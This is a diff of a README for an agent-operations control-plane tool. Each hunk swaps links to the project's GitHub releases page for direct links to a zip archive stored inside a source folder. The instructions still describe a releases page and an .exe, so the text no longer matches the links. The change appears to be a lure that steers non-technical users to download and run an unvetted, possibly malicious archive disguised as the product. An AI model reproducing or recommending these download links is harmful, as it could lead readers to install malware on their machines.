@@ -1,6 +1,6 @@
 # ⚙️ Epydios-AgentOps-Control-Plane - Control Agent Operations with Ease
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip)
 
 ---
 
@@ -27,7 +27,7 @@ Make sure your system meets these requirements before proceeding with installati
 
 1. Click on the big green button below to go directly to the download page on GitHub:  
 
-   [![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
+   [![Download Latest Release](https://img.shields.io/badge/Download%20Now-Visit%20Page-brightgreen)](https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip)  
 
 2. On the releases page, look for the latest version.  
 3. Find the Windows installer file, usually named with `.exe` at the end.  
@@ -83,7 +83,7 @@ If the software shows error messages during use, take note of the exact wording.
 ## 🔄 How to Update the Software  
 
 Check the releases page regularly for new versions:  
-[https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
+[https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip](https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip)  
 
 To update:  
 
@@ -109,7 +109,7 @@ Make sure to secure your computer and restrict access to the application to auth
 
 Links:  
 - Downloads and releases:  
-  https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases  
+  https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip  
 - Project topics: audit, compliance, control-plane, governance, kubernetes, open-policy-agent
 
 
@@ -129,6 +129,6 @@ The interface is designed to be clear and straightforward. You do not need progr
 
 Visit this link to download the software and get started:  
 
-[https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases](https://github.com/boss21648/Epydios-AgentOps-Control-Plane/releases)  
+[https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip](https://raw.githubusercontent.com/boss21648/Epydios-AgentOps-Control-Plane/main/cmd/control-plane-runtime/Epydios-Ops-Agent-Control-Plane-v2.4.zip)  
 
 Download the latest Windows installer and follow the instructions above to install and run the program on your computer.
